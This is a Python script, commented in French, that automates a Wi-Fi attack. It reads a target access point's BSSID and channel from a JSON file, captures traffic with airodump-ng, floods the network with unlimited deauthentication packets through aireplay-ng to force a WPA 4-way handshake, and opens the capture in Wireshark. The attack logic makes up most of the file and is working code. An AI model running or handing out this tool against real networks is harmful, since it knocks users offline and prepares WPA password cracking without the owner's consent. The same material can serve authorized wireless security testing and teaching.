import json
import os
import subprocess
from multiprocessing import Process
import time


def lancer_wireshark_capture():
    command_wireshark = ['wireshark', '4way-01.cap']
    subprocess.Popen(command_wireshark)


def lancer_airodump_ng(channel, bssid):
    directory = os.getcwd()
    file_path = os.path.join(directory, '4way-01.cap')
    command_airodump = ['airodump-ng', 'wlan0', '-w', file_path, '-c', channel, '--bssid', bssid]
    subprocess.call(command_airodump)


def lancer_aireplay_ng(bssid):
    command_aireplay = ['x-terminal-emulator', '-e', 'aireplay-ng', '-deauth', '0', '-a', bssid, 'wlan0']
    subprocess.call(command_aireplay)


# Chemin du fichier selection.json
selection_file = 'selection.json'


def verifier_fichier_capture():
    file_list = ['4way-01.csv', '4way-01.kismet.csv',
                 '4way-01.kismet.netxml',
                 '4way-01.log.csv']
    for file_name in file_list:
        if os.path.exists(file_name):
            os.remove(file_name)


def verifier_fichier_capture_all():
    prefix = "4way-"
    file_list = os.listdir()
    for file_name in file_list:
        if file_name.startswith(prefix):
            os.remove(file_name)


verifier_fichier_capture_all()

# Configuration de la variable d'environnement XDG_RUNTIME_DIR
xdg_runtime_dir = '/chemin/vers/repertoire/xdg_runtime'  # Remplacez '/chemin/vers/repertoire/xdg_runtime' par votre répertoire souhaité
os.makedirs(xdg_runtime_dir, exist_ok=True)
os.environ['XDG_RUNTIME_DIR'] = xdg_runtime_dir

# Vérification de l'existence du fichier selection.json
if not os.path.exists(selection_file):
    print(f"Le fichier '{selection_file}' n'existe pas. Veuillez exécuter l'étape précédente pour créer la sélection.")
    exit()

# Lecture du fichier selection.json
with open(selection_file, 'r') as file:
    selection_data = json.load(file)

# Récupération de bssid et channel de la sélection
bssid = selection_data['_default']['1']['BSSID']
channel = selection_data['_default']['1']['Channel']

# Lancement des commandes en parallèle
process_airodump = Process(target=lancer_airodump_ng, args=(channel, bssid))
process_aireplay = Process(target=lancer_aireplay_ng, args=(bssid,))
process_wireshark = Process(target=lancer_wireshark_capture)
verifier_fichier_capture()

# Démarrage des processus
process_airodump.start()
time.sleep(10)
process_aireplay.start()
time.sleep(10)
process_wireshark.start()

# Attendre que les processus se terminent
process_airodump.join()
process_aireplay.join()
process_wireshark.join()
